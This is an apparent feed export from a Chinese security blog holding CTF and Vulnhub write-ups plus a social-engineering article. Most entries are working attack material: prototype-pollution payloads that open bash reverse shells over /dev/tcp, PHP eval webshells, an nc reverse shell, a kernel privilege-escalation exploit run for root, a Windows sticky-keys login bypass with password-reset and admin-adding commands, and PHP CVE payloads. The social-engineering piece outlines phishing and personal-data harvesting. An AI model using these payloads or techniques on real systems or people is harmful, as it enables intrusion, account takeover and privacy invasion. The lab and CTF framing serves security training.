class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录失败&#x27;</span>&#125;);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试代码如下:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">copy</span>(<span class="params">object1, object2</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> object2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> object2 &amp;&amp; key <span class="keyword">in</span> object1) &#123;</span><br><span class="line">            <span class="title function_">copy</span>(object1[key], object2[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            object1[key] = object2[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> user = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">userinfo</span> = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">isVIP</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">isAdmin</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">isAuthor</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//body=JSON.parse(&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;123&quot;&#125;&#125;&#x27;);</span></span><br><span class="line">body=<span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;123&quot;&#125;&#125;&#125;&#x27;</span>);</span><br><span class="line"><span class="title function_">copy</span>(user.<span class="property">userinfo</span>,body);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(user.<span class="property">__proto__</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(user.<span class="property">__proto__</span>.<span class="property">__proto__</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(user.<span class="property">userinfo</span>.<span class="property">__proto__</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(user.<span class="property">userinfo</span>.<span class="property">__proto__</span>.<span class="property">__proto__</span>)</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;__proto__&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;__proto__&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;query&quot;</span>:<span class="string">&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/10000 0&gt;&amp;1\&quot;&#x27;)&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="web341"><a class="header-anchor" href="#web341">¶</a>web341</h2><ul><li>描述: 同上</li></ul><p>开启了ejs渲染, 利用ejs打原型链(在<code>package.json</code>可以找到ejs和其对应的版本号)</p><blockquote><p>还有特征就是在<code>app.js</code>中调用<code>res.render</code> 来渲染 ejs 模板</p></blockquote><p><a href="https://zhuanlan.zhihu.com/p/690718215">ejs模板注入&amp;js原型链污染（[GKCTF 2021]easynode）</a></p><p>简而言之, 原本在ejs模板中是空的; 但是一旦有了值，ejs模板就会将outputFunctionName当作函数执行</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>:<span class="string">&quot;a&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>:<span class="string">&quot;a&quot;</span>,</span><br><span class="line">    <span class="string">&quot;__proto__&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;__proto__&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;a; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/vps/port 0&gt;&amp;1\&quot;&#x27;); //&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="web342-343"><a class="header-anchor" href="#web342-343">¶</a>web342-343</h2><ul><li>描述: 同上</li></ul><p>jade原型链污染参考: <a href="https://xz.aliyun.com/t/7025?time__1311=n4%2BxnD0Dy7itGQ%3D47KDsA3rZDBYa3D9QrlGrYD">再探 JavaScript 原型链污染到 RCE</a></p><p>同样开启了ejs, 也是原型链污染; 注意是用POST在<code>/login</code>路由发包</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;compileDebug&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;Code&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;self&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;line&quot;</span><span class="punctuation">:</span><span class="string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/10000&gt;&amp;1\&quot;&#x27;)&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;compileDebug&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;Code&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;self&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;line&quot;</span><span class="punctuation">:</span><span class="string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/10000 0&gt;&amp;1\&quot;&#x27;)&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="web344"><a class="header-anchor" href="#web344">¶</a>web344</h2><ul><li>描述: 是一段代码</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag = <span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">url</span>.<span class="title function_">match</span>(<span class="regexp">/8c|2c|\,/ig</span>))&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag :)&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> query = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(req.<span class="property">query</span>.<span class="property">query</span>);</span><br><span class="line">  <span class="keyword">if</span>(query.<span class="property">name</span>===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;query.<span class="property">password</span>===<span class="string">&#x27;ctfshow&#x27;</span>&amp;&amp;query.<span class="property">isVIP</span>===<span class="literal">true</span>)&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag. :)&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>过滤了8c和2c, 大概就是%8c(逗号), 似乎%2c也是逗号, 那就换成<code>&amp;</code>就好了; payload如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?query=&#123;&quot;name&quot;:&quot;admin&quot;&amp;query=&quot;password&quot;:&quot;ctfshow&quot;&amp;query=&quot;isVIP&quot;:true&#125;</span><br></pre></td></tr></table></figure><p>url编码后传值即可</p>]]></content>
      
      
      <categories>
          
          <category> ctfshow靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> 原型链污染 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>社会工程学</title>
      <link href="/article/social-engineering/"/>
      <url>/article/social-engineering/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>社会工程学</h1><hr><h2 id="原因"><a class="header-anchor" href="#原因">¶</a>原因</h2><p>相对于防守严密的系统, 人是系统中最薄弱的部分</p><p>互联网的普及使得更多的&quot;易骗人群&quot;可以接触网络, 而我们可以从他们那里获取敏感信息; 我们常常戏称村口大妈是这个村的&quot;情报网&quot;, 因为很简单就能从她们嘴里套出信息. 互联网何尝不是一个巨大的&quot;村&quot;, 我们需要的是找到&quot;大妈&quot;从而获取目标的信息</p><h2 id="本质"><a class="header-anchor" href="#本质">¶</a>本质</h2><p>收集个人/集体在互联网上产生的痕迹并加以利用</p><p>如果和受害者产生交互, 那就增加: 欺骗的艺术</p><h2 id="分类"><a class="header-anchor" href="#分类">¶</a>分类</h2><p>社会工程学攻击包括四个阶段:</p><ul><li>制作鱼饵：信息收集, 确定目标并对目标的信息进行汇总</li><li>下杆：与目标建立第一次交谈(HOOK, 下套)</li><li>上钩：与目标建立信任并获取信息</li><li>退场：不引起目标怀疑的离开现场</li></ul><p>通常社会工程学攻击可以划分为两类:</p><ul><li>基于人的社工</li><li>基于计算机的社工</li></ul><blockquote><p>书籍: 《我是谁，没有绝对的安全》</p></blockquote><p>常见可获取信息系统包括: 中航信系统, 春秋航空系统, 12306系统, 三大运营商网站, 全国人口基本信息资源库, 全国机动车/驾驶人信息资源库, 各大快递系统(越权), 全国出入境人员资源库, 全国在逃人员信息资源库, 企业相关系统, 全国安全重点单位信息资源库等</p><p>常用方式: 网络钓鱼, 电话钓鱼, 伪装模拟常用工具: 搜索引擎例如google(google hacker), 公开/私密社工库, QQ</p><h2 id="常见方法"><a class="header-anchor" href="#常见方法">¶</a>常见方法</h2><h3 id="交流模型"><a class="header-anchor" href="#交流模型">¶</a>交流模型</h3><p>即谈话/交流, 社工就是利用这些语言和非语言的潜在信息, 改变/影响目标的感知, 从而得到想要的结果</p><h3 id="网络钓鱼"><a class="header-anchor" href="#网络钓鱼">¶</a>网络钓鱼</h3><p>最常见的方法, 利用该方法可以向某个特定的目标系统发起攻击</p><p>利用目标或者是与目标相关的兴趣爱好或是直接基于身份信息精心设计鱼饵, 鱼饵通常是一个包含木马的文件, 一个伪造的网页</p><p>最终目的基本都是控制主机并将其作为跳板</p><h3 id="信息刺探"><a class="header-anchor" href="#信息刺探">¶</a>信息刺探</h3><p>其实就是公开信息收集, 越详细越好</p><h2 id="详细方法"><a class="header-anchor" href="#详细方法">¶</a>详细方法:</h2><p>这里主要是信息刺探, 交流模型更应该归类于心理学, 因为获取更多信息必须与受害者交流/监听, 而网络钓鱼需要更多的代码与安全基础(其实是这俩都游走在法律边缘)</p><h3 id="从IP入手"><a class="header-anchor" href="#从IP入手">¶</a>从IP入手</h3><p>常见的通过IP可收集到的基础信息:</p><ul><li>网站本身: 域名, IP地址, 有无CDN, 编程语言, 是否存在WAF(Web应用防护系统)</li><li>网站服务器: 端口, 操作系统, 指纹框架, Web容器</li><li>其他信息: 旁站信息, 信息泄露查询, nmap查询IP地址拓扑图, 网络权重</li></ul><p>然后可以继续收集其他资料</p><ul><li>可以利用IP物理定位确定大致位置</li><li>可以用Whois查询域名的所有人, 注册商, 邮件, 电话号码等(只有邮箱也可以邮件反查域名)</li></ul><h3 id="从社交信息入手"><a class="header-anchor" href="#从社交信息入手">¶</a>从社交信息入手</h3><p>通过各大网站已知有价值的ID获取其他信息(如电话号码, QQ, 微信), 通过电话或QQ获取用户的登录账号</p><ul><li>社工库qq查手机或反查等等</li><li>通过邮箱获取注册过的网站</li><li>密码找回获得手机号部分信息, 可以结合不同城市的手机号段获取大部分手机号, 剩下的就是爆破了</li><li>个人的空间和平台上的言论</li><li>直接利用社交媒体添加目标, 套话</li></ul><blockquote><p>可能需要一些虚拟号码和虚拟邮箱</p></blockquote><h3 id="可能的方式"><a class="header-anchor" href="#可能的方式">¶</a>可能的方式</h3><ol><li>有的手机拍照后会在图片中写入GPS信息, 而且是默认开启的; 此时查看照片的详细信息的时候可以看到GPS信息</li><li>同一个人多个不同平台可能用的同样的账号密码, 甚至弱密码</li></ol>]]></content>
      
      
      <categories>
          
          <category> Web知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 社会工程学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jangow-1-01</title>
      <link href="/article/Jangow-1-01/"/>
      <url>/article/Jangow-1-01/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>jangow: 1.0.1</h1><hr><blockquote><p>来源: <a href="https://www.vulnhub.com/entry/jangow-101,754/">vulnhub靶场-Jangow: 1.0.1</a></p><p>目标: 没说, get root吧</p><p>还是比较简单的靶机, 唯一难受的就是网络配置问题了</p></blockquote><h2 id="环境配置"><a class="header-anchor" href="#环境配置">¶</a>环境配置</h2><p>kali: 192.168.110.130</p><p>target: 192.168.110.131</p><blockquote><p>注意此处可能会存在网络问题, 这里就不再给出解决办法</p><p>该靶机被笔者用于测试别的功能, 所以环境可能不太一样</p></blockquote><h2 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sS 192.168.110.0/24</span><br></pre></td></tr></table></figure><p>开放端口21, 80</p><p>访问之后在<code>192.168.110.131/site/</code>找到一个类似博客的地方, 其中在<code>http://192.168.110.131/site/busque.php?buscar=</code>处发现似乎是一个注入点</p><p>测试得到可以进行RCE:</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241019195039215.png" alt="image-20241019195039215"></p><h2 id="getshell"><a class="header-anchor" href="#getshell">¶</a>getshell</h2><p>可以写shell, 也可以直接反弹shell, 这里选择了写shell然后蚁剑连接</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;?php @eval($_POST[1]); ?&gt;&#x27;</span> &gt; shell1.php</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241019195418116.png" alt="image-20241019195418116"></p><p>反弹shell可以用php重新写一个文件用来反弹shell, 这里直接用的命令执行</p><p>除了443端口 似乎都反弹不出去</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># RCE反弹</span></span><br><span class="line">bash -c <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/192.168.110.130/443 0&gt;&amp;1&#x27;</span></span><br><span class="line"><span class="comment"># php反弹</span></span><br><span class="line">&lt;?php system(<span class="string">&quot;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.110.130 443 &gt;/tmp/f&quot;</span>);?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241019200554300.png" alt="image-20241019200554300"></p><h2 id="信息收集-v2"><a class="header-anchor" href="#信息收集-v2">¶</a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"><span class="comment"># Linux jangow01 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line">gcc -v</span><br><span class="line"><span class="comment"># </span></span><br></pre></td></tr></table></figure><p>在<code>/var/www/html/site/wordpress</code>下有配置文件, 给了mysql的账密<code>desafio02 : abygurl69</code></p><p>只能用于登录ftp, 但是ftp也拿不到东西</p><p>在<code>/var/www/html/.backup</code>中找到新的账密, <code>jamgow01 : abygurl69</code></p><h2 id="提权"><a class="header-anchor" href="#提权">¶</a>提权</h2><p>已知版本为 4.4.0-31-generic 的 Ubuntu</p><p><img src="C:/Users/CAO/AppData/Roaming/Typora/typora-user-images/image-20241019214740861.png" alt="image-20241019214740861"></p><p>对应漏洞为<code>CVE-2017-16995</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">locate linux/local/45010.c</span><br><span class="line"><span class="built_in">cp</span> /usr/share/exploitdb/exploits/linux/local/45010.c ~/Desktop</span><br><span class="line"><span class="comment"># 是非root情况</span></span><br></pre></td></tr></table></figure><p>然后用蚁剑上传到靶机, 当然用python开一个http服务也行</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> 777 45010.c</span><br><span class="line">gcc 45010.c -o exp</span><br><span class="line"><span class="built_in">chmod</span> 777 exp</span><br><span class="line">./exp</span><br></pre></td></tr></table></figure><p>执行命令编译出来的文件即可, 成功提权</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241019215539082.png" alt="image-20241019215539082"></p>]]></content>
      
      
      <categories>
          
          <category> vulnhub靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 提权 </tag>
            
            <tag> 反弹shell </tag>
            
            <tag> 漏洞利用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>win7-10粘滞键漏洞复现</title>
      <link href="/article/sticky-keys/"/>
      <url>/article/sticky-keys/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>win7-10 粘滞键漏洞</h1><hr><h2 id="原理"><a class="header-anchor" href="#原理">¶</a>原理</h2><p>按下五次shift可以调用位于<code>c:\windows\system32\sethc.exe</code>的程序, 通过其他方式将这个绑定到cmd上直接调用到cmd, 通过指令对用户密码进行修改或者删除, 从而登录不知道密码的计算机</p><p>在没有进入系统的情况下, 运行的程序是以最高权限去运行的</p><blockquote><p>但是部分系统通过补丁对其进行了修复, 有打游戏的会禁用粘滞键</p></blockquote><h2 id="基本流程"><a class="header-anchor" href="#基本流程">¶</a>基本流程</h2><ol><li>首先,在未登录系统时,连续按5次shift键,弹出程序<code>c:\windows\system32\sethc.exe</code></li><li>其次,接着强制关机想办法进入&quot;启动启动修复(推荐)&quot;界面,该界面存在一个漏洞,它能打开一个本地的错误TXT文件.</li><li>再次,通过TXT文件的打开选项,在未进入系统之前就打开C盘存放“sethc.exe”的位置,接着将cmd.exe程序复制一个副本,并命名为“sethc.exe”.</li><li>最后,重启计算机再次按下5次Shift键时,会弹出CMD界面,再输入命令修改登录密码.</li></ol><h2 id="相关操作"><a class="header-anchor" href="#相关操作">¶</a>相关操作</h2><ol><li>CMD工具路径：<code>c:\windows\system32\cmd</code></li><li>用户账户密码存储位置：<code>c:\windows\system32\config\SAM</code></li><li>修改账户密码：<code>net user 用户名 新密码</code></li><li>创建一个新用户：<code>net user 用户名 新密码 /add</code></li><li>删除用户：<code>net user 用户名 /del</code></li><li>提示管理员：<code>net localgroup administrators 用户名 /add</code></li></ol><h2 id="漏洞复现"><a class="header-anchor" href="#漏洞复现">¶</a>漏洞复现</h2><p>当出现“正在启动 Windows”界面时, 立刻强制关机电脑; 这是模拟现实生活中突然断电或不正常关机的场景, 从而弹出“修复模式&quot;; (不行就多试几次)</p><p>开机进入“windows错误恢复”</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241109215438.png" alt="image.png"></p><p>选择<code>启动自动修复(推荐)</code>, 然后会弹出来: 您想使用&quot;系统还原&quot;还原计算机吗?点击<code>取消</code></p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241109215601.png" alt="image.png"></p><p>点击查看问题详细信息, 而不是不发送和发送有关此问题的信息; 随后翻到最底下点击那个txt文件的超链接</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241109215730.png" alt="image.png"></p><p>在记事本上面的选项卡中点击文件 -&gt; 打开进入<code>c:\windows\system32</code>, 找到<code>sethc</code>文件, 更改其名字;</p><blockquote><p>此时因为未进入系统, 我们拥有最高权限, 这个操作是允许的;</p></blockquote><p>将sethc改名之后, 我们找到cmd并创建一个副本, 将其更名为sethc</p><p>退出,重新启动计算机, 然后在登录界面按下五次shift, 发现弹出cmd窗口</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241109220025.png" alt="image.png"></p><h2 id="后续操作"><a class="header-anchor" href="#后续操作">¶</a>后续操作</h2><p>更改已经存在的账号</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 设置无密码(此处账户为smith)    </span></span><br><span class="line">net user smith <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>新增账号</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 新增一个用户(用户abc,密码abcde)</span></span><br><span class="line">net abc abcde /add</span><br><span class="line"></span><br><span class="line"><span class="comment"># 给它提权,添加到管理员组中</span></span><br><span class="line">net localgroup administrators abc /add</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除用户</span></span><br><span class="line">net user abc /del</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web入门_phpCVE</title>
      <link href="/article/ctfshow-webbasic-phpcve/"/>
      <url>/article/ctfshow-webbasic-phpcve/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>phpCVE</h1><hr><blockquote><p>搜索一般都是 <code>php/版本号 cve</code>或<code>php/版本号 漏洞</code></p></blockquote><h2 id="web311"><a class="header-anchor" href="#web311">¶</a>web311</h2><ul><li>描述: 似曾相识,就这一个文件，不用扫描</li></ul><p>抓包发现提示CVE, 以及<code>X-Powered-By: PHP/7.1.33dev</code></p><p>网上搜索, 对应的CVE为<code>CVE-2019-11043</code>, 再寻找可利用的poc</p><p><a href="https://blog.exsvc.cn/article/php-cve-2019-11043.html">参考1</a>, <a href="https://github.com/neex/phuip-fpizdam">github_poc</a></p><blockquote><p>我找到的poc好多都是基于这个写的, 这个poc需要安装go环境</p><p>他甚至给了你一个pdf详细解释这个漏洞</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install golang</span><br><span class="line"><span class="comment"># yum install golang -y</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/neex/phuip-fpizdam.git</span><br><span class="line"><span class="built_in">cd</span> phuip-fpizdam</span><br><span class="line"><span class="comment"># 国内直接用这个exp可能会无法编译通过，需要先将代理设置为国内代理</span></span><br><span class="line">go <span class="built_in">env</span> -w GOPROXY=https://goproxy.cn</span><br><span class="line">go get -v &amp;&amp; go build</span><br><span class="line"><span class="comment"># 编译完成后执行，注意地址后必须加 index.php</span></span><br><span class="line">go run . <span class="string">&quot;https://23072827-c4c4-4285-ace5-7cce969a1d98.challenge.ctf.show/index.php&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241010164353411.png" alt="image-20241010164353411"></p><p>在URL后加上<code>/index.php/?a=ls</code> 多请求几次, 不是每次都能成功:</p><p>可以得到当前目录下<code>fl0gHe1e.txt</code>, 修改为<code>/index.php/?a=cat%20fl0gHe1e.txt</code>即可</p><h2 id="web312"><a class="header-anchor" href="#web312">¶</a>web312</h2><ul><li>描述: 你懂的</li></ul><p>抓包得到返回包提示<code>X-Powered-By: PHP/5.6.38</code></p><p>利用该关键词搜索漏洞, 得到: PHP imap远程命令执行漏洞(<code>CVE-2018-19518</code>)</p><p><a href="https://github.com/vulhub/vulhub/tree/master/php/CVE-2018-19518">github_漏洞介绍</a>, 结合这个就可以轻松拿到shell</p><p>生成payload:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>= <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;echo <span class="subst">$a</span> | base64 -d &gt;/var/www/html/1.php&quot;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># x+-oProxyCommand%3decho%09ZWNobyBQRDl3YUhBZ1FHVjJZV3dvSkY5UVQxTlVXekZkS1RzL1BnPT0gfCBiYXNlNjQgLWQgPi92YXIvd3d3L2h0bWwvMS5waHA=|base64%09-d|sh&#125;</span></span><br></pre></td></tr></table></figure><p>利用payload即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1=system(&#x27;tac ctfshowfl4g&#x27;);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241010172405280.png" alt="image-20241010172405280"></p><h2 id="web313"><a class="header-anchor" href="#web313">¶</a>web313</h2><ul><li>描述: 你懂的</li></ul><p>抓包得到返回包提示<code>X-Powered-By: PHP/5.4.1</code></p><p>搜索得到 PHP-CGI远程代码执行<code>CVE-2012-1823</code>, 测试一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-c 指定php.ini文件的位置</span><br><span class="line">-n 不要加载php.ini文件</span><br><span class="line">-d 指定配置项</span><br><span class="line">-b 启动fastcgi进程</span><br><span class="line">-s 显示文件源码</span><br><span class="line">-T 执行指定次该文件</span><br><span class="line">-h和-？ 显示帮助</span><br></pre></td></tr></table></figure><p>访问<code>/?-s</code>, 发现确实返回了源码</p><p>可以利用远程包含一个木马文件, 这里尝试写个马</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># GET:</span><br><span class="line">/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input</span><br><span class="line"># 直接写在下面</span><br><span class="line">&lt;?php file_put_contents(&quot;1.php&quot;,&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p>结果 Permission denied in php://input, 拉倒了</p><p>那就直接执行命令试试, 发现是可以执行的</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241010181453690.png" alt="image-20241010181453690"></p><p>那就找flag, 最后在<code>/somewhere/fla9.txt</code>中找到, POC:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /somewhere/fla9.txt&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="web314"><a class="header-anchor" href="#web314">¶</a>web314</h2><ul><li>描述: 严格说算不上cve</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//phpinfo</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ 